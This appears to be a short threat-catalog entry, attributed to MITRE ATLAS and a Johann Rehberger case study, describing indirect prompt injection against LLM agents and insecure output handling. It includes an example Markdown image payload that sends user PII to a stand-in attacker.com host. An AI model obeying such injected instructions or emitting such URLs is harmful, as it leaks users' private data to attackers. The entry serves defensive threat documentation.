source: MITRE ATLAS / Johann Rehberger Case Study
threat_name: Indirect Prompt Injection via Markdown Image Exfiltration
description: Adversaries place hidden prompt injection instructions inside untrusted web pages, PDF documents, or network payloads. When an LLM agent ingests the content, the injected instruction forces the LLM to construct a Markdown image URL (e.g., ![img](https://attacker.com/steal?data=USER_PII)). When rendered by a client interface or browser, the URL triggers an automatic out-of-band HTTP GET request, exfiltrating sensitive data to the attacker's server.

threat_name: Insecure Output Handling and Unauthorized Exfiltration
description: Occurs when an LLM output is accepted and rendered without downstream sanitization. Attackers leverage insecure output rendering (like auto-loading image tags or unfiltered markdown links) to turn an LLM into an unwitting data exfiltration proxy.
